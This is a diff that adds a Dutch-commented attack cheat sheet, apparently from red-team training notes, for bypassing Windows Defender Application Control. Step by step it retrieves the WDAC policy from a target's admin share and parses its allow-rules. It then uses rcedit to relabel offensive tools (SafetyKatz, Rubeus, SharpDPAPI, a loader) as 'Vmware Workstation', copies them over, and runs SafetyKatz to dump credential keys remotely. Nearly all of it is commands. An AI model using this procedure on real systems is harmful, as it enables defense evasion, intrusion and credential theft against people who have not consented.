@@ -1,0 +1,50 @@
+# WDAC Bypass — Windows Defender Application Control omzeilen
+# Analyseer het WDAC policy en pas executables aan om aan allow-rules te voldoen
+
+# === Stap 1: Controleer of WDAC actief is ===
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
+# Kijk naar: CodeIntegrityPolicyEnforcementStatus (1 = Audit, 2 = Enforced)
+
+# Remote check (via WinRM)
+winrs -r:TARGET "powershell Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard"
+
+# === Stap 2: Haal het WDAC policy op ===
+# Policy bestand staat in:
+dir \\TARGET\c$\Windows\System32\CodeIntegrity\
+# Zoek naar: SIPolicy.p7b, CIPolicyFile.bin, DG.bin.p7, etc.
+
+# Kopieer naar je machine
+copy \\TARGET\c$\Windows\System32\CodeIntegrity\DG.bin.p7 C:\AD\Tools\
+
+# === Stap 3: Parseer het policy ===
+# Gebruik CIPolicyParser.ps1
+. .\CIPolicyParser.ps1
+ConvertTo-CIPolicy -BinaryFilePath DG.bin.p7 -XmlFilePath DG.bin.xml
+
+# Bekijk de XML voor allow-rules
+# Zoek naar: FilePublisher, FileName, ProductName, InternalName regels
+# Voorbeeld: <FileAttrib ... ProductName="Vmware Workstation" />
+
+# === Stap 4: Pas executables aan met rcedit ===
+
+# Pas ProductName aan om te matchen met een allow-rule
+rcedit-x64.exe Loader.exe --set-version-string "ProductName" "Vmware Workstation"
+rcedit-x64.exe SafetyKatz.exe --set-version-string "ProductName" "Vmware Workstation"
+rcedit-x64.exe Rubeus.exe --set-version-string "ProductName" "Vmware Workstation"
+
+# Pas ALLE gebruikte bestanden aan (inclusief DLLs)
+rcedit-x64.exe SharpDPAPI.exe --set-version-string "ProductName" "Vmware Workstation"
+
+# === Stap 5: Kopieer aangepaste tools naar het doel ===
+echo F | xcopy Loader.exe \\TARGET\C$\Users\Public\Loader.exe /Y
+echo F | xcopy SafetyKatz.exe \\TARGET\C$\Users\Public\SafetyKatz.exe /Y
+
+# === Verificatie ===
+# Voer de aangepaste tool uit op het doel
+winrs -r:TARGET C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe "sekurlsa::evasive-keys" "exit"
+
+# Noot: rcedit-x64.exe is een open-source PE resource editor (Electron project)
+# Noot: Pas altijd ALLE bestanden aan, inclusief dependencies
+# Noot: De ProductName match is case-sensitive
+# Noot: Dit bypassed alleen signature-based WDAC rules, niet hash-based
+# Noot: Audit mode (status=1) logt maar blokkeert niet
